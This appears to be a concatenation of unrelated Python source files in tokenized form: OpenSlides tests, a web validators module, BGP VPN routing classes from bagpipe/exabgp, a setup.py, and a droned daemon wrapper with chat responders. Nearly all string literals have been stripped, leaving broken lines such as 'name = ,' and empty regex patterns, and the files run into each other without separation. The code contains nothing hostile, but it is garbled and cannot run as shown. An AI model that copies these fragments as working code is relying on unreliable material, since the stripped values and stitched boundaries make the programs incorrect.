self . assertEqual ( len ( list ( filter_obj ) ) , 0 ) \n 
\n 
\n 
~~ ~~ def validator_for_testing ( value ) : \n 
~~~ """\n    Validator for testing.\n    """ \n 
if value == : \n 
~~~ raise ValidationError ( { : } ) \n 
\n 
\n 
~~ ~~ @ receiver ( config_signal , dispatch_uid = ) \n 
def set_simple_config_view_integration_config_test ( sender , ** kwargs ) : \n 
~~~ """\n    Sets a simple config view with some config variables but without\n    grouping.\n    """ \n 
yield ConfigVariable ( \n 
name = , \n 
default_value = None , \n 
label = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = 0 , \n 
input_type = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = , \n 
input_type = , \n 
choices = ( \n 
{ : , : } , { : , : } ) \n 
yield ConfigVariable ( \n 
name = , \n 
default_value = , \n 
validators = ( validator_for_testing , ) ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = None , \n 
label = , \n 
hidden = True ) \n 
~~ from unittest import TestCase \n 
from unittest . mock import MagicMock , patch \n 
\n 
from openslides . users . serializers import UserFullSerializer \n 
from openslides . utils . rest_api import ValidationError \n 
\n 
\n 
class UserCreateUpdateSerializerTest ( TestCase ) : \n 
~~~ def test_validate_no_data ( self ) : \n 
~~~ """\n        Tests, that the validator raises a ValidationError, if not data is given.\n        """ \n 
serializer = UserFullSerializer ( ) \n 
data = { } \n 
\n 
with self . assertRaises ( ValidationError ) : \n 
~~~ serializer . validate ( data ) \n 
\n 
~~ ~~ @ patch ( ) \n 
def test_validate_no_username ( self , generate_username ) : \n 
~~~ """\n        Tests, that an empty username is generated.\n        """ \n 
generate_username . return_value = \n 
serializer = UserFullSerializer ( ) \n 
data = { : } \n 
\n 
new_data = serializer . validate ( data ) \n 
\n 
self . assertEqual ( new_data [ ] , ) \n 
\n 
~~ def test_validate_no_username_in_patch_request ( self ) : \n 
~~~ """\n        Tests, that an empty username is not set in a patch request context.\n        """ \n 
view = MagicMock ( action = ) \n 
serializer = UserFullSerializer ( context = { : view } ) \n 
data = { : } \n 
\n 
new_data = serializer . validate ( data ) \n 
\n 
self . assertIsNone ( new_data . get ( ) ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\ncore.validators.py\n~~~~~~\n\n:copyright: (c) 2014 by @zizzamia\n:license: BSD (See LICENSE for details)\n""" \n 
# Imports outside Bombolone \n 
import re \n 
\n 
# Thanks http://stackoverflow.com/questions/7160737/python-how-to-validate-a-url-in-python-malformed-or-not URL_REGEX = re . compile ( \n 
# http:// or https:// \n 
#domain... #localhost... \n 
# ...or ip \n 
# optional port \n 
, re . IGNORECASE ) \n 
USERNAME_REGEX = re . compile ( , re . I ) \n 
FULLNAME_REGEX = re . compile ( , re . U ) \n 
EMAIL_REGEX = re . compile ( , re . IGNORECASE ) \n 
\n 
class CheckValue ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ pass \n 
\n 
~~ def length ( self , data , minimum = - 1 , maximum = - 1 ) : \n 
~~~ """ Validates the length of a string\n        :param min: The minimum required length of the string.\n        :param max: The maximum length of the string \n\n        """ \n 
len_input = len ( data ) \n 
\n 
if len_input < minimum or maximum != - 1 and len_input > maximum : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ def regexp ( self , data , regex , flags = 0 ) : \n 
~~~ """ Validates the data with regexp\n        :param regex: The regular expression string to use.\n        :param flags: The regexp flags eg. re.I (case-insensitive) \n\n        """ \n 
regex = re . compile ( regex , flags ) \n 
if regex . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def username ( self , data ) : \n 
~~~ """ Validates the username\n        :param username: The string \n\n        """ \n 
if USERNAME_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def full_name ( self , data ) : \n 
~~~ """ Validates the full name\n        :param full_name: The string \n\n        """ \n 
if FULLNAME_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def email ( self , data ) : \n 
~~~ """ Validates the email\n        :param email: The string \n\n        """ \n 
if EMAIL_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def url ( self , data ) : \n 
~~~ """ Validates the url\n        :param url: The string \n\n        """ \n 
if URL_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def url_two ( self , data ) : \n 
~~~ """\n        Validates the url \n        :param url: The string  \n        \n        """ \n 
regex = re . compile ( , re . IGNORECASE ) \n 
if regex . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def is_integer ( self , data ) : \n 
~~~ """ """ \n 
try : \n 
~~~ tmp = int ( data ) \n 
return True \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def float ( self , data ) : \n 
~~~ """ """ \n 
try : \n 
~~~ tmp = float ( data ) \n 
return True \n 
~~ except : \n 
~~~ return False \n 
# Copyright (c) 2012 Mitch Garnaat http://garnaat.org/ \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a \n 
# copy of this software and associated documentation files (the \n 
# "Software"), to deal in the Software without restriction, including \n 
# without limitation the rights to use, copy, modify, merge, publish, dis- \n 
# tribute, sublicense, and/or sell copies of the Software, and to permit \n 
# persons to whom the Software is furnished to do so, subject to the fol- \n 
# lowing conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included \n 
# in all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS \n 
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABIL- \n 
# ITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT \n 
# SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, \n 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS \n 
# IN THE SOFTWARE. \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
# encoding: utf-8 \n 
\n 
# Copyright 2014 Orange \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ ~~ import logging \n 
import socket \n 
\n 
from bagpipe . bgp . common import utils \n 
from bagpipe . bgp . common import logDecorator \n 
\n 
from bagpipe . bgp . vpn . vpn_instance import VPNInstance \n 
\n 
from bagpipe . bgp . engine import RouteEvent \n 
\n 
from bagpipe . bgp . vpn . dataplane_drivers import DummyDataplaneDriver as _DummyDataplaneDriver \n 
\n 
from bagpipe . bgp . common . looking_glass import LookingGlass , LGMap \n 
\n 
from bagpipe . exabgp . structure . vpn import RouteDistinguisher , VPNLabelledPrefix \n 
from bagpipe . exabgp . structure . mpls import LabelStackEntry \n 
from bagpipe . exabgp . structure . address import AFI , SAFI \n 
from bagpipe . exabgp . structure . ip import Inet , Prefix \n 
from bagpipe . exabgp . message . update . route import Route \n 
from bagpipe . exabgp . message . update . attribute . nexthop import NextHop \n 
from bagpipe . exabgp . message . update . attribute . communities import ECommunities \n 
\n 
\n 
class DummyDataplaneDriver ( _DummyDataplaneDriver ) : \n 
\n 
~~~ pass \n 
\n 
\n 
~~ class VRF ( VPNInstance , LookingGlass ) : \n 
# component managing a VRF: \n 
# - calling a driver to instantiate the dataplane \n 
# - registering to receive routes for the needed route targets \n 
# - calling the driver to setup/update/remove routes in the dataplane \n 
# - cleanup: calling the driver, unregistering for BGP routes \n 
\n 
~~~ type = "ipvpn" \n 
afi = AFI ( AFI . ipv4 ) \n 
safi = SAFI ( SAFI . mpls_vpn ) \n 
\n 
@ logDecorator . log \n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ VPNInstance . __init__ ( self , * args , ** kwargs ) \n 
self . readvertised = set ( ) \n 
\n 
~~ def _routeFrom ( self , prefix , label , rd ) : \n 
~~~ return Route ( VPNLabelledPrefix ( self . afi , self . safi , prefix , rd , \n 
[ LabelStackEntry ( label , True ) ] \n 
) ) \n 
\n 
~~ def generateVifBGPRoute ( self , macAdress , ipPrefix , prefixLen , label ) : \n 
# Generate BGP route and advertise it... \n 
~~~ route = self . _routeFrom ( Prefix ( self . afi , ipPrefix , prefixLen ) , label , \n 
RouteDistinguisher ( \n 
RouteDistinguisher . TYPE_IP_LOC , None , \n 
self . bgpManager . getLocalAddress ( ) , \n 
self . instanceId ) \n 
) \n 
self . log . debug ( "route attributes: %s" , route . attributes ) \n 
\n 
return self . _newRouteEntry ( self . afi , self . safi , self . exportRTs , \n 
route . nlri , route . attributes ) \n 
\n 
~~ def _getLocalLabels ( self ) : \n 
~~~ for portData in self . macAddress2LocalPortData . itervalues ( ) : \n 
~~~ yield portData [ ] \n 
\n 
~~ ~~ def _getRDFromLabel ( self , label ) : \n 
# FIXME: this is a crude hack that will break beyond 10000 VRFs \n 
~~~ return RouteDistinguisher ( RouteDistinguisher . TYPE_IP_LOC , None , \n 
self . bgpManager . getLocalAddress ( ) , \n 
10000 + label ) \n 
\n 
~~ def _routeForReAdvertisement ( self , prefix , label ) : \n 
~~~ route = self . _routeFrom ( prefix , label , \n 
self . _getRDFromLabel ( label ) ) \n 
\n 
nh = Inet ( 1 , socket . inet_pton ( socket . AF_INET , \n 
self . dataplane . driver . getLocalAddress ( ) ) ) \n 
\n 
route . attributes . add ( NextHop ( nh ) ) \n 
\n 
route . attributes . add ( ECommunities ( self . readvertiseToRTs ) ) \n 
\n 
routeEntry = self . _newRouteEntry ( self . afi , self . safi , \n 
self . readvertiseToRTs , \n 
route . nlri , route . attributes ) \n 
return routeEntry \n 
\n 
~~ @ logDecorator . log \n 
def _readvertise ( self , nlri ) : \n 
~~~ self . log . debug ( "Start re-advertising %s from VRF" , nlri . prefix ) \n 
for label in self . _getLocalLabels ( ) : \n 
~~~ self . log . debug ( "Start re-advertising %s from VRF, with label %s" , \n 
nlri . prefix , label ) \n 
# need a distinct RD for each route... \n 
routeEntry = self . _routeForReAdvertisement ( nlri . prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . ADVERTISE , routeEntry ) ) \n 
\n 
~~ self . readvertised . add ( nlri . prefix ) \n 
\n 
~~ @ logDecorator . log \n 
def _readvertiseStop ( self , nlri ) : \n 
~~~ self . log . debug ( "Stop re-advertising %s from VRF" , nlri . prefix ) \n 
for label in self . _getLocalLabels ( ) : \n 
~~~ self . log . debug ( "Stop re-advertising %s from VRF, with label %s" , \n 
nlri . prefix , label ) \n 
routeEntry = self . _routeForReAdvertisement ( nlri . prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . WITHDRAW , routeEntry ) ) \n 
\n 
~~ self . readvertised . remove ( nlri . prefix ) \n 
\n 
~~ def vifPlugged ( self , macAddress , ipAddressPrefix , localPort , \n 
advertiseSubnet ) : \n 
~~~ VPNInstance . vifPlugged ( self , macAddress , ipAddressPrefix , localPort , \n 
advertiseSubnet ) \n 
\n 
label = self . macAddress2LocalPortData [ macAddress ] [ ] \n 
for prefix in self . readvertised : \n 
~~~ self . log . debug ( "Re-advertising %s with this port as next hop" , \n 
prefix ) \n 
routeEntry = self . _routeForReAdvertisement ( prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . ADVERTISE , routeEntry ) ) \n 
\n 
~~ ~~ def vifUnplugged ( self , macAddress , ipAddressPrefix , advertiseSubnet ) : \n 
~~~ label = self . macAddress2LocalPortData [ macAddress ] [ ] \n 
for prefix in self . readvertised : \n 
~~~ self . log . debug ( "Stop re-advertising %s with this port as next hop" , \n 
prefix ) \n 
routeEntry = self . _routeForReAdvertisement ( prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . WITHDRAW , routeEntry ) ) \n 
\n 
~~ VPNInstance . vifUnplugged ( self , macAddress , ipAddressPrefix , \n 
advertiseSubnet ) \n 
\n 
# Callbacks for BGP route updates (TrackerWorker) ######################## \n 
\n 
~~ def _route2trackedEntry ( self , route ) : \n 
~~~ if isinstance ( route . nlri , VPNLabelledPrefix ) : \n 
~~~ return route . nlri . prefix \n 
~~ else : \n 
~~~ self . log . error ( "We should not receive routes of type %s" , \n 
type ( route . nlri ) ) \n 
return None \n 
\n 
~~ ~~ def _toReadvertise ( self , route ) : \n 
~~~ return ( len ( set ( route . routeTargets ) . intersection ( \n 
set ( self . readvertiseFromRTs ) ) ) > 0 ) \n 
\n 
~~ def _imported ( self , route ) : \n 
~~~ return ( len ( set ( route . routeTargets ) . intersection ( \n 
set ( self . importRTs ) ) ) > 0 ) \n 
\n 
~~ @ utils . synchronized \n 
@ logDecorator . log \n 
def _newBestRoute ( self , entry , newRoute ) : \n 
\n 
~~~ prefix = entry \n 
\n 
if self . readvertise : \n 
# check if this is a route we need to re-advertise \n 
~~~ self . log . debug ( "route RTs: %s" , newRoute . routeTargets ) \n 
self . log . debug ( "readv from RTs: %s" , self . readvertiseFromRTs ) \n 
if self . _toReadvertise ( newRoute ) : \n 
~~~ self . log . debug ( "Need to re-advertise %s" , prefix ) \n 
self . _readvertise ( newRoute . nlri ) \n 
if not self . _imported ( newRoute ) : \n 
~~~ self . log . debug ( "No need to setup dataplane for:%s" , prefix ) \n 
return \n 
\n 
~~ ~~ ~~ encaps = self . _checkEncaps ( newRoute ) \n 
if not encaps : \n 
~~~ return \n 
\n 
~~ self . dataplane . setupDataplaneForRemoteEndpoint ( \n 
prefix , newRoute . attributes . get ( NextHop . ID ) . next_hop , \n 
newRoute . nlri . labelStack [ 0 ] . labelValue , newRoute . nlri , encaps ) \n 
\n 
~~ @ utils . synchronized \n 
@ logDecorator . log \n 
def _bestRouteRemoved ( self , entry , oldRoute , last ) : \n 
\n 
~~~ prefix = entry \n 
\n 
if self . readvertise and last : \n 
# check if this is a route we were re-advertising \n 
~~~ if self . _toReadvertise ( oldRoute ) : \n 
~~~ self . log . debug ( "Need to stop re-advertising %s" , prefix ) \n 
self . _readvertiseStop ( oldRoute . nlri ) \n 
if not self . _imported ( oldRoute ) : \n 
~~~ self . log . debug ( "No need to setup dataplane for:%s" , prefix ) \n 
return \n 
\n 
~~ ~~ ~~ if self . _skipRouteRemoval ( last ) : \n 
~~~ self . log . debug ( "Skipping removal of non-last route because " \n 
"dataplane does not want it" ) \n 
return \n 
\n 
~~ self . dataplane . removeDataplaneForRemoteEndpoint ( \n 
prefix , oldRoute . attributes . get ( NextHop . ID ) . next_hop , \n 
oldRoute . nlri . labelStack [ 0 ] . labelValue , oldRoute . nlri ) \n 
\n 
~~ def getLGMap ( self ) : \n 
~~~ return { \n 
"readvertised" : ( LGMap . VALUE , [ repr ( prefix ) for prefix in \n 
self . readvertised ] ) \n 
} \n 
# encoding: utf-8 \n 
~~ ~~ """\nattributes.py\n\nCreated by Thomas Mangin on 2009-11-05.\nCopyright (c) 2009-2012 Exa Networks. All rights reserved.\nModified by Orange - 2014\n""" \n 
\n 
from bagpipe . exabgp . message . update . attribute import AttributeID , Flag , Attribute \n 
\n 
# =================================================================== Origin (1) \n 
\n 
class Origin ( Attribute ) : \n 
~~~ ID = AttributeID . ORIGIN \n 
FLAG = Flag . TRANSITIVE \n 
MULTIPLE = False \n 
\n 
IGP = 0x00 \n 
EGP = 0x01 \n 
INCOMPLETE = 0x02 \n 
\n 
def __init__ ( self , origin ) : \n 
~~~ self . origin = origin \n 
\n 
~~ def pack ( self ) : \n 
~~~ return self . _attribute ( chr ( self . origin ) ) \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . pack ( ) ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if self . origin == 0x00 : return \n 
if self . origin == 0x01 : return \n 
if self . origin == 0x02 : return \n 
return \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return str ( self ) \n 
\n 
~~ def __cmp__ ( self , other ) : \n 
~~~ if ( not isinstance ( other , Origin ) \n 
or ( self . origin != other . origin ) \n 
) : \n 
~~~ return - 1 \n 
~~ else : \n 
~~~ return 0 \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
# Copyright 2014, John Dewey \n 
# All Rights Reserved. \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
\n 
~~ ~~ ~~ import setuptools \n 
\n 
setuptools . setup ( \n 
setup_requires = [ ] , \n 
pbr = True ) \n 
############################################################################### \n 
#   Copyright 2006 to the present, Orbitz Worldwide, LLC. \n 
# \n 
#   Licensed under the Apache License, Version 2.0 (the "License"); \n 
#   you may not use this file except in compliance with the License. \n 
#   You may obtain a copy of the License at \n 
# \n 
#       http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#   Unless required by applicable law or agreed to in writing, software \n 
#   distributed under the License is distributed on an "AS IS" BASIS, \n 
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#   See the License for the specific language governing permissions and \n 
#   limitations under the License. \n 
############################################################################### \n 
\n 
__doc__ = """Daemon Maker eXtraordinaire - aka DMX an application wrapper""" \n 
__author__ = """Justin Venus <justin.venus@orbitz.com>""" \n 
\n 
#setup for daemonizing other processes \n 
if __name__ != : raise ImportError ( ) \n 
import os \n 
import sys \n 
\n 
#find out where we are on the filesystem \n 
DIRECTORY = os . path . abspath ( os . path . dirname ( __file__ ) ) \n 
#cool, now setup the droned/kitt lib paths \n 
sys . path . insert ( 0 , os . path . abspath ( os . path . join ( DIRECTORY , , , ) ) ) \n 
\n 
#could probably use some lovin!!! \n 
unforkedPid = os . getpid ( ) \n 
childProcessPid = 0 \n 
\n 
from twisted . internet import protocol , defer \n 
from twisted . python . log import FileLogObserver , textFromEventDict \n 
from twisted . python . util import untilConcludes \n 
import signal \n 
\n 
DEFAULT_REACTORS = { \n 
: , \n 
: , \n 
: , \n 
} \n 
\n 
#helper to get the best reactor \n 
def set_reactor ( ) : \n 
~~~ import platform \n 
REACTORNAME = DEFAULT_REACTORS . get ( platform . system ( ) , ) \n 
#get the reactor in here \n 
if REACTORNAME == : \n 
~~~ from twisted . internet import kqreactor \n 
kqreactor . install ( ) \n 
~~ elif REACTORNAME == : \n 
~~~ from twisted . internet import epollreactor \n 
epollreactor . install ( ) \n 
~~ elif REACTORNAME == : \n 
~~~ from twisted . internet import pollreactor \n 
pollreactor . install ( ) \n 
~~ else : #select is the default \n 
~~~ from twisted . internet import selectreactor \n 
selectreactor . install ( ) \n 
\n 
~~ from twisted . internet import reactor \n 
set_reactor = lambda : reactor \n 
return reactor \n 
\n 
\n 
~~ class ManagedLogger ( FileLogObserver ) : \n 
~~~ """overriding emit to preserve original logs""" \n 
timeFormat = "" #destroy formatting \n 
\n 
def emit ( self , eventDict ) : \n 
~~~ """ah, logs should be pretty much as the app intended""" \n 
text = textFromEventDict ( eventDict ) \n 
if text is None : return \n 
untilConcludes ( self . write , text ) \n 
untilConcludes ( self . flush ) # Hoorj! \n 
\n 
\n 
~~ ~~ class DaemonProtocol ( protocol . ProcessProtocol ) : \n 
~~~ """we need to track your app and help you log it\'s information""" \n 
def __init__ ( self , name , label , r , deferred , ** kwargs ) : \n 
~~~ self . deferred = deferred #callback deferred is always last \n 
self . reactor = r \n 
out = { \n 
: % ( name , label ) \n 
} \n 
err = { \n 
: % ( name , label ) \n 
} \n 
self . name = name \n 
self . label = label \n 
#setup application logging \n 
import droned . logging \n 
self . log_stdout = droned . logging . logWithContext ( ** out ) \n 
self . log_stderr = droned . logging . logWithContext ( ** err ) \n 
\n 
~~ def inConnectionLost ( self ) : \n 
~~~ """inConnectionLost! stdin is closed! (we probably did it)""" \n 
pass \n 
\n 
~~ def errReceived ( self , data ) : \n 
~~~ """write the error message""" \n 
self . log_stderr ( str ( data ) ) \n 
\n 
~~ def outReceived ( self , data ) : \n 
~~~ """write the out message""" \n 
self . log_stdout ( str ( data ) ) \n 
\n 
~~ def outConnectionLost ( self ) : \n 
~~~ """outConnectionLost! The child closed their stdout!""" \n 
pass \n 
\n 
~~ def errConnectionLost ( self ) : \n 
~~~ """errConnectionLost! The child closed their stderr.""" \n 
pass \n 
\n 
~~ def connectionMade ( self ) : \n 
~~~ """Process is running, we close STDIN""" \n 
global closestdin \n 
if closestdin : \n 
~~~ self . transport . closeStdin ( ) # close stdin \n 
~~ global childProcessPid \n 
global unforkedPid \n 
x = unforkedPid \n 
unforkedPid = 0 \n 
#kill the intermediarry pid to let droned move on \n 
if x : self . reactor . callLater ( 2.0 , os . kill , x , signal . SIGTERM ) \n 
#see twisted.internet.interfaces.IProcessTransport \n 
childProcessPid = self . transport . pid \n 
sys . stdout . write ( % ( self . name , self . label , childProcessPid ) ) \n 
\n 
~~ def processExited ( self , reason ) : \n 
~~~ """our process has exited, time to shutdown.""" \n 
sys . stdout . write ( % ( self . name , ) ) \n 
if not self . deferred . called : \n 
~~~ self . deferred . errback ( reason ) \n 
~~ global unforkedPid \n 
global childProcessPid \n 
childProcessPid = 0 \n 
if unforkedPid : os . kill ( unforkedPid , signal . SIGTERM ) \n 
\n 
~~ processEnded = processExited \n 
\n 
\n 
~~ class DaemonWrapper ( object ) : \n 
~~~ """we take care of your application in a race free way.""" \n 
SIGNALS = dict ( ( k , v ) for v , k in signal . __dict__ . iteritems ( ) if v . startswith ( ) and not v . startswith ( ) ) \n 
def __init__ ( self , r , name , label , cmd , args , env ) : \n 
~~~ self . reactor = r \n 
self . name = name \n 
self . label = label \n 
self . fqcmd = cmd \n 
self . args = args \n 
self . env = env \n 
self . exitCode = 0 \n 
self . deferred = defer . succeed ( None ) \n 
import droned . logging \n 
self . log = droned . logging . logWithContext ( type = ) \n 
\n 
~~ def routeSignal ( self , signum , frame ) : \n 
~~~ """send signals we receive to the wrapped process""" \n 
if signum == signal . SIGTERM : \n 
~~~ signal . signal ( signal . SIGTERM , signal . SIG_IGN ) \n 
#make sure we get stopped \n 
self . reactor . callLater ( 120 , self . reactor . stop ) \n 
~~ global childProcessPid \n 
if childProcessPid : \n 
~~~ self . log ( % ( self . SIGNALS [ signum ] , childProcessPid ) ) \n 
try : os . kill ( childProcessPid , signum ) \n 
except : \n 
~~~ droned . logging . err ( % ( self . SIGNALS [ signum ] , childProcessPid ) ) \n 
\n 
~~ ~~ ~~ def processResult ( self , result ) : \n 
~~~ """try to get the exit code""" \n 
#give a moment for propagation  \n 
self . reactor . callLater ( 3.0 , self . reactor . stop ) \n 
return result \n 
\n 
~~ def running ( self ) : \n 
~~~ """called when the reactor is running""" \n 
#signals go to the new child, need to do this once the reactor is \n 
\n 
global masksignals \n 
if masksignals : \n 
~~~ for signum , signame in self . SIGNALS . items ( ) : \n 
~~~ if signame in ( , ) : continue \n 
try : signal . signal ( signum , self . routeSignal ) \n 
except RuntimeError : pass #tried to set an invalid signal \n 
~~ ~~ from droned . clients import command \n 
self . log ( % ( self . name , self . label ) ) \n 
pargs = ( self . name , self . label , self . reactor ) \n 
pkwargs = { } \n 
global usetty \n 
global path \n 
self . deferred = command ( self . fqcmd , self . args , self . env , \n 
path , usetty , { } , DaemonProtocol , \n 
* pargs , ** pkwargs \n 
) \n 
self . deferred . addBoth ( self . processResult ) \n 
return self . deferred \n 
\n 
\n 
~~ ~~ env = os . environ . copy ( ) #copy the environment settings \n 
args = tuple ( sys . argv [ 1 : ] ) #get all args after the original caller \n 
\n 
\n 
#needed for log routing \n 
logdir = env . pop ( , os . path . join ( os . path . sep , ) ) \n 
masksignals = bool ( env . pop ( , True ) ) \n 
closestdin = bool ( env . pop ( , True ) ) \n 
name = env . pop ( , ) \n 
label = env . pop ( , ) \n 
usetty = bool ( env . pop ( , ) ) \n 
path = env . pop ( , os . path . sep ) \n 
#try to make sure the log dir is clean and organized \n 
if name not in logdir : \n 
~~~ t = os . path . join ( logdir , name , label ) \n 
try : \n 
~~~ if not os . path . exists ( t ) : \n 
~~~ os . makedirs ( t , mode = 0 755 ) \n 
~~ logdir = t \n 
~~ except : pass \n 
\n 
\n 
#we only need to fork once b/c spawn in droned took care of the second fork \n 
~~ if args and os . path . exists ( args [ 0 ] ) : \n 
~~~ try : os . setsid ( ) #be a leader \n 
except : pass #when debugging ie (running outside of twistd) this fails \n 
if os . fork ( ) == 0 : \n 
~~~ os . chdir ( os . path . sep ) #be nice \n 
os . umask ( 0 ) #be pure \n 
#should go back to the original protocol \n 
#NOTE droned protocol will look for this on stdout \n 
sys . stdout . write ( % ( os . getpid ( ) , ) ) \n 
sys . stderr . flush ( ) \n 
sys . stdout . flush ( ) \n 
import droned . logging \n 
sys . stdout = droned . logging . StdioKabob ( 0 ) \n 
sys . stderr = droned . logging . StdioKabob ( 1 ) \n 
\n 
maxfd = 4096 #maybe high \n 
try : \n 
~~~ import resource # Resource usage information. \n 
maxfd = resource . getrlimit ( resource . RLIMIT_NOFILE ) [ 1 ] \n 
if ( maxfd == resource . RLIM_INFINITY ) : \n 
~~~ maxfd = 4096 #maybe high \n 
~~ ~~ except : pass \n 
\n 
# Iterate through and close all file descriptors. \n 
for fd in range ( 0 , maxfd ) : \n 
~~~ try : os . close ( fd ) \n 
except OSError : pass #ignore \n 
~~ os . open ( \n 
hasattr ( os , "devnull" ) and os . devnull or "/dev/null" , \n 
os . O_RDWR \n 
) \n 
os . dup2 ( 0 , 1 ) \n 
os . dup2 ( 0 , 2 ) \n 
#create logging contexts \n 
loggers = [ \n 
% ( name , label ) , \n 
% ( name , label ) , \n 
] \n 
#defaults for logging are pretty good \n 
droned . logging . logToDir ( directory = logdir ) \n 
\n 
#setup logging \n 
reactor = set_reactor ( ) \n 
#preserve application logging, but mixin daily rotation \n 
droned . logging . logToDir ( \n 
directory = logdir , \n 
LOG_TYPE = tuple ( loggers ) , \n 
OBSERVER = ManagedLogger \n 
) \n 
#create our wrapper \n 
dmx = DaemonWrapper ( reactor , name , label , args [ 0 ] , args [ 1 : ] , env ) \n 
\n 
def killGroup ( ) : \n 
~~~ """kill everybody""" \n 
dmx . log ( ) \n 
signal . signal ( signal . SIGTERM , signal . SIG_IGN ) \n 
os . kill ( - os . getpgid ( os . getpid ( ) ) , signal . SIGTERM ) \n 
\n 
~~ reactor . addSystemEventTrigger ( , , killGroup ) \n 
reactor . callWhenRunning ( dmx . running ) \n 
reactor . run ( ) #run until killed \n 
sys . exit ( dmx . exitCode ) \n 
~~ else : \n 
#this is the parent that will exit to make app a daemon \n 
~~~ reactor = set_reactor ( ) \n 
#sit and wait for the child to terminate us \n 
reactor . callLater ( 120 , sys . exit , 1 ) \n 
reactor . run ( ) \n 
sys . exit ( 0 ) \n 
~~ ~~ sys . exit ( 255 ) \n 
\n 
############################################################################### \n 
#   Copyright 2006 to the present, Orbitz Worldwide, LLC. \n 
# \n 
#   Licensed under the Apache License, Version 2.0 (the "License"); \n 
#   you may not use this file except in compliance with the License. \n 
#   You may obtain a copy of the License at \n 
# \n 
#       http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#   Unless required by applicable law or agreed to in writing, software \n 
#   distributed under the License is distributed on an "AS IS" BASIS, \n 
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#   See the License for the specific language governing permissions and \n 
#   limitations under the License. \n 
############################################################################### \n 
from droned . models . team import Team , SupportAgent \n 
from droned . models . issue import Issue \n 
from droned . responders import responder \n 
\n 
\n 
@ responder ( pattern = "^teams$" , form = "teams" , help = "List known Teams" ) \n 
def teams ( conversation ) : \n 
~~~ teamlist = . join ( "%s (%d members)" % ( team . name , len ( team . agents ) ) for team in Team . objects ) \n 
conversation . say ( + teamlist , useHTML = False ) \n 
\n 
\n 
~~ @ responder ( pattern = "^members\\s+(?P<name>\\S+)" , form = "members <team>" , help = "List members of a team" ) def members ( conversation , name ) : \n 
~~~ if not Team . exists ( name ) : \n 
~~~ conversation . say ( "No team named \\"%s\\" exists." % name ) \n 
~~ else : \n 
~~~ team = Team ( name ) \n 
if team . agents : \n 
~~~ members = . join ( agent . jid for agent in team . agents ) \n 
heading = "%s members:\\n" % name \n 
conversation . say ( heading + members , useHTML = False ) \n 
~~ else : \n 
~~~ conversation . say ( "That team has no members." ) \n 
\n 
\n 
~~ ~~ ~~ @ responder ( pattern = "^join\\s+(?P<name>\\S+)" , form = "join <team>" , help = "Tell droned you want to join a team" def join ( conversation , name ) : \n 
~~~ if not Team . exists ( name ) : \n 
~~~ conversation . say ( "No team named \\"%s\\" exists." % name ) \n 
~~ else : \n 
~~~ team = Team ( name ) \n 
team . addMember ( conversation . buddy ) \n 
conversation . say ( "You are now on the %s team." % name ) \n 
\n 
\n 
~~ ~~ @ responder ( pattern = "^leave\\s+(?P<name>\\S+)" , form = "leave <team>" , help = "Tell droned you want to leave a team" def leave ( conversation , name ) : \n 
~~~ if not Team . exists ( name ) : \n 
~~~ conversation . say ( "No team named \\"%s\\" exists." % name ) \n 
~~ else : \n 
~~~ team = Team ( name ) \n 
